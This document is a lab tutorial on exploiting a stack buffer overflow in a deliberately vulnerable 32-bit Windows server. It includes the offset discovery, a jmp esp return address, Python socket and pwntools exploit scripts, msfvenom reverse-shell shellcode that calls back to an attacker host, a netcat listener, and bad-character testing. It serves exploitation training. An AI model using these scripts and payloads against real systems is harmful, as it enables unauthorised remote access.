# 32-bit Stack-based Buffer Overflow

This is a quick lab to capture a high level process of how to exploit a primitive stack-based buffer overlow vulnerability. This lab is based on an intentionally vulnerable 32-bit Windows program provided by security tube.

<br>
# Overview
<h2> Vulnerability </h2>
At a high level, exploiting a buffer overflow boils down to the following key points:

```yaml
- Attacker overflows vulnerable program's memory buffer by writing to it more data (including the malicious code, usually shellcode) than the program anticipated, but did nothing (bound checking) to prevent it from happening;

- When a memory buffer is overflowed, the adjacent memory in the vulnerable program is replaced with malicious content supplied by an attacker;

- Attacker subverts the vulnerable program and forces it to execute the malicious code, which was written to the compromised program's memory, when the program's memory buffer was overflowed;
  
- The vulnerable program starts executing malicious code, and depending on what the vulnerable program is/what security context it runs in and whether it is being exploited locally or over the network, results in attacker escalating their privileges on an already compromised system or provides them with a remote access to system being exploited.
```

<br>
# Lab
In this lab, we're going to exploit the vulnerable program and make it execute our shellcode by following the below process:
```yaml
- Send some data to the vulnerable program and observe it crash;

- Inspect the program's registers at the time of the crash, focusing on EIP and ESP;

- Send some more data to the vulnerable program, observe it crash and inspect the registers;

- Determine if we can take control of / overwrite the EIP register;

- Determine how much data we need to send to the vulnerable program, before we can overflow its stack and get control of the EIP;

- Determine where our shellcode is written to, which as we will see soon, is pointed to by the ESP;

- Find a memory address that contains the instruction jmp esp, so that we can point the EIP to this address, so that the vulnerable program transfers control to our shellcode (pointed to by the ESP) when the exploit is triggered;

- Overflow the vulnerable program's stack with a buffer larger than it expected. The buffer will be crafted in such a way, that once in the vulnerable program's memory, it will have:

{
 - Written our shellcode;
 - Overwritten the function's return address in the stack with a memory address that contains the  jmp esp instruction, which will force the vulnerable program to jump to our schellcode, once it tries to return after processing our supplied ovesized buffer;
}

Profit - receive a reverse shell from the vulnerable server.
```


Visually, a simplified diagram of the stack overflow vulnerability that we will exploit / vulnerable program's memory layout before and after the overflow would look something like this:

![image](https://github.com/Imeneallouche/Binary-Exploitation-Roadmap/assets/89279264/5397c799-9db9-4999-b0fd-77295b0aac2a)

# Observing the crash:

always observe the value that is stored in EIP and the ESP (EIP for the next instruction and the ESP to see if we overflowed the stack)

```bash
"hello" | nc 192.168.99.3 10000
```
```bash
python -c "print('A'*200)" | nc 192.168.99.3 10000
```

<br>

# Finding EIP offset:

by using the **pwntools library** you can generate a pattern

```python
from pwn import *
pattern = cyclic(300)
```

send that pattern to the vuln program:

```bash
python -c "print(cyclic(300))" |  nc 192.168.99.3 10000
```
we will see that:
```yaml
- EIP points to 6A413969: which is part of the string pattern we submitted to the vulnerable program;
- ESP points to 0060FB20: which is indeed the memory address that we should place our shellcode.
```

This means that we will need to ensure that we overwrite the function's return address (the address it wants to return to when it finishes processing our oversized malicious buffer) with a memory address that contains the jmp esp instruction (we will find it next), which when executed, would make the program jump to our shellcode (because it's pointed to by the ESP) and execute it.

Now we have all the information we need in order to find the actual number of bytes we need to send to the vulnerable program, before we can overwrite the EIP and make it point to the 0060FB20 (ESP), as we've just learned above. 

```python
from pwn import *

cyclic_find(b'raac')
```
```yaml
Offset: 268
```

This tells us that the EIP is at offset 268 and that we need to send 268 A's before we can overwrite it:

```bash
python -c "print('A'*268 + 'RETN' + 'SHELLCODE'*10)"
```

Note the following:
```yaml
The EIP: points to 4E544552, which is our string RETN in hex;
After the RETN: at 0060FB20 (pointed to by the ESP), we see our string SHELLCODE (green) repeated 10 times.
```

<br>

# Finding JMP ESP

Now, that we know where our shellcode is going to be located and how to control the EIP register, we need to overwrite the EIP with a memory address that points to the start of our shellcode. Since, our shellcode is pointed to by the ESP,  it means that we could overwrite the EIP with a memory address that contains the jmp esp instruction that would make the vulnerable program jump to the ESP and execute our shellcode after it completes processing our malicious buffer and wants to return to the caller function.
To find a memory address containing **jmp esp instruction**, we can simply use Ctrl+F jmp esp in xdbg and discover that jmp esp.

```yaml
NOTE: Remember the memory address of jmp esp - 7798BD1B in our case - we will need it soon for the exploit code.
```

# Exploit Skeleton
we can use socket or pwntools for that, let's try something new like socket then

```py
import socket, sys

# connect to a socket on a vulnerable server
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.99.3", 10000))

# send A's
buf = b"A"*268

# overwrite EIP with string RETN
buf += b"RETN"

# shellcode
buf += b"SHELLCODE"

# send payload
sock.send(buf)
sock.close()
```

equivalent using pwntools:

```py
from pwn import *

host, port = "192.168.99.3", 10000
sock = remote(host, port)

# Craft the payload
payload = b"A" * 268  # Padding
payload += p32(0xdeadbeef)  # Replace with your desired return address
payload += b"SHELLCODE"  # Replace with your shellcode

# Send the payload
sock.send(payload)

# Close the connection
sock.close()
```

<br>

# Generating Shellcode

Let's generate a shellcode for a simple reverse tcp shell (it will connect back to 192.168.99.2:443) for python:
```py
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.99.2 LPORT=443 -f python
```

meaning:
```yaml
msfvenom: This is the command-line interface to generate payloads using the Metasploit Framework.

-p windows/shell_reverse_tcp: Specifies the payload to be generated. In this case, it's a reverse shell payload for Windows that establishes a TCP connection back to the attacker's machine.

LHOST=192.168.99.2: Sets the attacker's IP address as the local host (LHOST) for the reverse connection. Replace 192.168.99.2 with your actual IP address.

LPORT=443: Sets the local port (LPORT) that the payload will connect to on the attacker's machine. In this example, it's port 443, which is commonly used for secure connections.

-f python: Specifies the output format of the payload. In this case, it's generated in Python format.
```

Add it to the python exploit skeleton and replace the RETN on line 11 with the memory address containing jmp esp, which is 7798BD1B (as usual, mind the endianness) in my case:

```py
import socket, sys

# connect to a socket on a vulnerable server
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.99.3", 10000))

# send A's
buf = b"A"*268

# overwrite EIP with address containing jmp esp instructions (inside ntdll.dll in my case)
buf += b"\x1b\xbd\x98\x77"

# shellcode
buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"

# send payload
sock.send(buf)

```

# Executing Exploit
Let's now fire up a netcat listener on 192.168.99.2:443 to catch a reverse shell incoming from the vulnerable server 192.168.99.3:
```bash
nc -lvp 443
```
```bash
python exploit.py
```

netcat receives a reverse shell, concluding that the vulnerable program's stack was successfully overflowed and program's execution flow was subverted, which resulted in our shellcode getting executed, giving us the reverse shell

# Finding Bad Characters

Bad characters in the context of buffer overflow exploitation refers to the characters that cannot be used in the shellcode as they would interfere with the vulnerable program and most likely make it crash.

Below provided are some guidelines on the general process of how to identify bad characters and how to deal with them.

<br>

# Generate Bad Characters String
Generate a list of all possible bad characters using bash:
```bash
for i in {0..255}; do printf "\\\x%02x" $i; done; echo -e "\r"
```
result:
```yaml
x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

<br>

# Testing for Bad Characters
Update the exploit to ensure it sends that string of bad characters as the payload:
```py
import socket, sys

# connect to a socket on a vulnerable server
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.99.3", 10000))

# send A's
buf = b"A"*268

# overwrite EIP with string RETN
buf += b"\x1b\xbd\x98\x77"
# 7798BD1B

# bad character testing payload
buf += b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

# send payload
sock.send(buf)
sock.close()
```
test the exploit against the target and investigate the memory dump of the memory location pointed to by the EIP after the crash:

![image](https://github.com/Imeneallouche/Binary-Exploitation-Roadmap/assets/89279264/9487cd54-0f8c-4d0e-a1ec-f367356185a0)

<br>

# Identifying Bad characters

Note the memory dump in blue contains our string for testing bad characters that we sent to the vulnerable program as our payload. Since we can see all the bytes ranging from 0x00 through to 0xFF in the correct order with no bytes missing or mangled, this confirms that we did not have to deal with any bad characters with this vulnerable program.
If we, however, spotted that a character, say, 0x0A was replaced with some random character, say, 0xE3, this would indicate that 0x0A is a bad character:

Once a bad character is identified: 

![image](https://github.com/Imeneallouche/Binary-Exploitation-Roadmap/assets/89279264/99eefd99-f628-4bbc-8dc8-254b4f99568b)

- In the exploit code, replace that bad character with a known good character - any character going before it, that did not get modified by the vulnerable program. In my case, that could be any byte from 0x01 to 0x09. I chose 0x09 as shown in green in the above screenshot... or you could simply remove the bad character from the string for testing bad characters;

- Fire the exploit against the target again;

- Inspect the memory dump again to see if there are any other bad characters;

- Repeat the process until all bad characters are identified.


<br>


# Encoding Shellcode

Once all the bad characters are identified, we need to ensure that our shellcode that we send to the vulnerable program does not contain them. When generating shellcode with **msfvenom**, we can give it a list of bad characters by specifying the **-b flag** and those characters will be encoded / replaced by others. In my case, I'd invoke msfvenom with -b 0xa:
```py
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.99.2 LPORT=443 -f python -b 0x0a
```
if you have more than 1 bad character (example:0x0a , 0x0b and 0x0c):
```py
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.99.2 LPORT=443 -f python -b "\x0a\x0b\x0c"
```
Below shows how msfvenom fails a couple of times to encode the 0x0a byte when using shikata ga nai encoder, but succeeds eventually when using the call4 dword xor. Assuming 0x0a is the only bad character, the shellcode is now bad character-free and ready to use:
